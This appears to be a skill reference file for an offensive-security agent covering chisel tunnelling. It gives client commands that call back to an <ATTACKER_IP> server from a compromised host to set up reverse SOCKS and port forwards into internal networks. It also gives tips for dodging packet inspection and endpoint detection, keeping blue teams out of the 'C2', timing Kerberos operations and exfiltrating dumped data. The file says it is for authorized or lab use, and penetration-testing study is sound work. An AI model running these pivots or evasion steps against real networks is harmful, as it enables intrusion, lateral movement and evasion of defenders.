---
name: chisel
description: "Auth/lab ref: HTTP-based TCP/UDP tunneling tool for port forwarding and SOCKS5 proxying through firewalls."
---

# chisel

**Goal**: Establish reverse and forward TCP/UDP tunnels using HTTP over WebSockets. Ideal for environments where SSH/TUN is unavailable, blocked, or where root privileges (needed for Ligolo-ng) are missing.

## Cognitive Stance

Chisel is an asymmetrical binary (client and server are bundled in one executable). In most offensive scenarios, the **Attacker runs the Server** and the **Compromised Host runs the Client**, establishing a persistent WebSocket tunnel outbound (to bypass NAT/inbound firewall rules).

## 1. Core Executions

### Attacker Setup (Server)
Start the server to listen for incoming connections from the compromised host, enabling reverse tunnels and SOCKS.

```bash
# Listen on port 8000. Accept reverse tunnels and SOCKS queries.
./chisel server -p 8000 --reverse --socks5
```

### Compromised Host Setup (Client)

**Reverse SOCKS5 (Dynamic Port Forwarding)**
The client dials the attacker, telling the attacker's Chisel server to spawn a SOCKS5 proxy locally on the attacker's machine (default port `1080`).
```bash
./chisel client <ATTACKER_IP>:8000 R:socks
```
*Result*: The attacker can now wrap their tools (e.g., `proxychains nmap`) through `127.0.0.1:1080` to reach the internal network behind the compromised host.

**Reverse Single Port Forwarding**
The attacker wants to reach a specific internal service (e.g., an RDP server at `10.0.0.5:3389`) that the compromised host can see.
```bash
# Syntax: R:<Local_Attacker_Port>:<Target_IP>:<Target_Port>
./chisel client <ATTACKER_IP>:8000 R:3389:10.0.0.5:3389
```

## 2. Advanced Evasion & Tunneling

- **TLS / HTTPS Masking**: Chisel supports TLS natively to avoid Deep Packet Inspection (DPI) flagging plain WebSockets.
  - Server: `./chisel server -p 443 --reverse --socks5 --tls-cert cert.pem --tls-key key.pem`
  - Client: `./chisel client https://<ATTACKER_IP> R:socks` (Add `--skip-tls-verification` if using self-signed certs).
- **Authentication**: Prevent Blue Teams or scanners from hijacking your Chisel C2:
  - Add `--auth user:password` to both client and server executions.

## 3. Strict Quality Gates

- **TCP Meltdown**: Avoid running intense TCP scans (like `nmap -sT -T4`) over SOCKS. Chisel multiplexes TCP over TCP, which causes performance collapse ("TCP Meltdown") due to conflicting re-transmission timers. Slow down the scans or strictly use Ligolo-ng if high-bandwidth stability is required.
- **OPSEC**: Modern EDRs aggressively flag the default `chisel` filename and common command-line arguments (`R:socks`). Compile from source using `-ldflags="-s -w"` to strip symbols and use UPX packing, or pass the connection string via environment variables if supported.

## 4. Short-lived reverse tunnel — diagnose the ingress path first

A reverse session that binds (`proxy#R:... Listening` / `Bound proxies`) then drops after a few seconds (`SSH disconnected`) is usually the **ingress path**, not chisel — and usually not your NAT/port-forward proxy either. Tested: a Docker-Desktop published-port reverse session over a **LAN/loopback** path stays up indefinitely (15s+, with or without keepalive). Short ~5s lifetimes were observed only over a **lab VPN tun** (e.g. HTB/OpenVPN), where the target's back-connection to the operator IP is reset by the **target/lab network** — an environment artifact, not the C2 box or Docker.

- **Diagnose, don't assume**: run a control first — a chisel client from a second box (or a container hairpin) to the published port over LAN/loopback. If the control stays up but the target's back-connection dies in seconds, the kill is the **target/lab egress**, not your tunnel — don't burn time "fixing" Docker/NAT. Try `--keepalive 3s` (can defeat an *idle* timeout; will NOT defeat a hard reset).
- **Stale-listener trap**: after a client dies, leftover loopback listeners (old `socat`/prior chisel clients squatting `R:<port>`) make the server log `server: cannot listen on R:<port>` and leave listeners that **accept then forward nothing** → `Connection refused`, truncated reads, or impacket `unpack requires a buffer of 4 bytes`. Kill stale forwarders by **explicit PID or `pkill -x <name>`**, never `pkill -f <pattern>` (it matches your own shell and self-kills).
- **Prefer the forward direction** when the compromised host can accept a new inbound port: run `chisel server` on the host, attacker runs `chisel client <host>:<port> socks`. DC/host firewalls usually block new inbound ports — test first.
- **Window-sync pattern (when the reverse path is genuinely short-lived, whatever the cause)**: hold the client alive in a long-lived parent session (`--max-retry-interval 1s`), then **poll the forwarded loopback port and fire a sub-second op the instant it opens**:
  ```bash
  while :; do timeout 1 bash -c 'echo>/dev/tcp/127.0.0.1/88' 2>/dev/null && { <impacket op>; break; }; sleep 0.2; done
  ```
  Single Kerberos `getTGT`/`getST`/S4U or one quick query fit one window. **Interactive/sustained sessions (MSSQL shell, long SOCKS, bloodhound-python) do NOT** — mint tickets/keys offline (or via a quick window) and run the heavy step from a host with **direct** routing, or dump data offline and exfil rather than holding a live connection.
